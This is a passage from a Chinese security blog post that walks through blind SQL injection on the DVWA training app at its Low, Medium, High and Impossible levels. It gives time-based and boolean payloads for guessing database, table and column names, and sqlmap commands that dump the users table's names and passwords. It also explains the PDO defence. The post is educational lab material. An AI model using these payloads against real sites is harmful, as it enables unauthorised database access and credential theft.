<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if(length(database())&#x3D;1,sleep(5),1) #,没有延迟</span><br><span class="line">1&#39; and if(length(database())&#x3D;2,sleep(5),1) #,没有延迟</span><br><span class="line">1&#39; and if(length(database())&#x3D;3,sleep(5),1) #,没有延迟</span><br><span class="line">1&#39; and if(length(database())&#x3D;4,sleep(5),1) #,明显延迟</span><br></pre></td></tr></table></figure>

<p>说明数据库名的长度为4个字符<br>采用二分法猜解数据库名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) #,明显延迟</span><br><span class="line">...</span><br><span class="line">1&#39; and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1) #,没有延迟</span><br><span class="line">1&#39; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1) #,没有延迟</span><br></pre></td></tr></table></figure>

<p>说明数据库名的第一个字符为小写字母d<br>重复以上步骤，即可猜解出数据库名<br>3、猜解数据库中的表名<br>猜解数据库中表的数数量：a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;1,sleep(5),1) #，没有延迟</span><br><span class="line">1&#39; and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;2,sleep(5),1) #，明显延迟</span><br></pre></td></tr></table></figure>

<p>说明数据库中有2个表<br>猜解第一个表名的长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;1,sleep(5),1) #，没有延迟</span><br><span class="line">...</span><br><span class="line">1&#39; and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9,sleep(5),1) #，明显延迟</span><br></pre></td></tr></table></figure>

<p>说明第一个表名的长度为9个字符<br>采用二分法即可猜解出表名<br>4、猜解表中的字段名<br>猜解表中字段的数量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if((select count(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;)&#x3D;1,sleep(5),1) #，没有延迟</span><br><span class="line">...</span><br><span class="line">1&#39; and if((select count(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;)&#x3D;8,sleep(5),1) #，明显延迟</span><br></pre></td></tr></table></figure>

<p>说明user表中有8个字段<br>猜解user表中第一个字段名的长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if(length(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1))&#x3D;1,sleep(5),1) #，没有延迟</span><br><span class="line">...</span><br><span class="line">1&#39; and if(length(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1))&#x3D;8,sleep(5),1) #，明显延迟</span><br></pre></td></tr></table></figure>

<p>说明user表中第一个字段的长度为7个字符<br>采用二分法即可猜解出各个字段名<br>5、猜解数据<br>同样采用二分法</p>
<p>■SQLmap：</p>
<p>抓包复制内容到文本，保存为blind.txt<br>python sqlmap.py -r blind.txt –-batch<br>python sqlmap.py -r blind.txt –dbs –threads 10<br>python sqlmap.py -r blind.txt –tables -D dvwa –threads 10<br>python sqlmap.py -r blind.txt –tables -D dvwa -T users –-columns –threads 10<br>python sqlmap.py -r blind.txt –tables -D dvwa -T users -C “first_name,password” –dump –threads 10</p>
<h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,‘,’’,\x1a进行转义，同时前端页面设置了下拉选择表单，以此来控制用户的输入。</p>
<p>漏洞利用：</p>
<p>■布尔盲注<br>抓包<br>修改参数id为1 and length(database())=4#，显示存在，说明数据库名的长度为4各字符。<br>修改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#，显示存在，说明数据库中的第一个表明长度为9各字符<br>修改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0x7573657273)=8 #，（0x7573657273为user是的16进制），显示存在，说明users表中有8个字段</p>
<p>■时间盲注<br>抓包<br>修改参数id为1 and if(length(database())=4,sleep(5),1)#，明显延迟，说明数据库名 定长度为4个字符<br>修改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据库中的第一个表名长度为9个字符<br>修改参数id为1 and if(select count(column_name) from information_schema.columns where table_name= 0x7573657273)=8,sleep(5),1)#，明显延迟，说明user表中有8个字段。</p>
<h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在SQL查询语句中添加了LIMIT 1，希望以此来控制只输出一个结果。</p>
<p>漏洞利用：</p>
<p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器执行sleep函数，会使得基于时间盲注的准确性受到影响，所以使用布尔盲注的方式进行注入。<br>1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符。<br>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据库中的第一个表名长度为9个字符。<br>1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273 )=8 #，显示存在，说明users表中有8个字段。</p>
<h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti CSRF token机制的加入进一步提高了安全性。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">他年少如歌</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chakalake.gitee.io/posts/46837/">https://chakalake.gitee.io/posts/46837/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chakalake.gitee.io" target="_blank">他年少如歌</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/004.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/52032/"><img class="prev-cover" data-src="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/016.webp" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web安全|文件包含</div></div></a></div><div class="next-post pull-right"><a href="/posts/2332/"><img class="next-cover" data-src="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/018.webp" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTTP协议学习</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> 他年少如歌</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 4.2.0"></head></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/calendar.js"></script><script src="/js/languages.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":120,"height":260},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>